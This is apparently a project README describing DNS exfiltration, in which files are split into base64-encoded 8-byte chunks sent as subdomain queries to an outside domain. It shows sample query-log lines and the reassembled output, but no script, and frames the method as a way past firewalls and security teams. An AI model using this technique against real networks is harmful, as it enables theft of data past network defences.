dns-exfiltration
================

Exfiltrate files via DNS. Based on [research by 16 Systems](http://16s.us/dns/).

### What the DNS Queries Look Like in Your Server's DNS Query Log

```
# The base64 encoded data is the payload
# Each query contains 8 bytes from the file

26-Aug-13 18:12:39 queries: info: client 8.x.x.x#18743:
  query: AAAAAAAAAAAxMjM0NTY3OA==.file1.16s.us IN A -ED (2.x.x.x)
26-Aug-13 18:12:49 queries: info: client 8.x.x.x#59519:
  query: AQAAAAAAAAA5MAoAAAAAAA==.file1.16s.us IN A -ED (2.x.x.x)
```

### What the Raw Reassembled File Looks Like

```
# First element is the sequence number. Second is bytes from file.
# You need the sequence number to reassemble the file in the right order.

(0, '12345678')
(1, '90\n\x00\x00\x00\x00\x00')
```

### That's It

This can be automated and made to be very efficient, but I won't get into that. It also works on very large files (2^32 * 8) and with any type of file (text, binary, etc). So, now you know how to exfiltrate files from a firewalled network using simple DNS queries. When/if the network security team figures this out and blocks it, I'll demonstrate a few other ways in which data can be exfiltrated.

Again, this information is meant for research/educational purposes only.
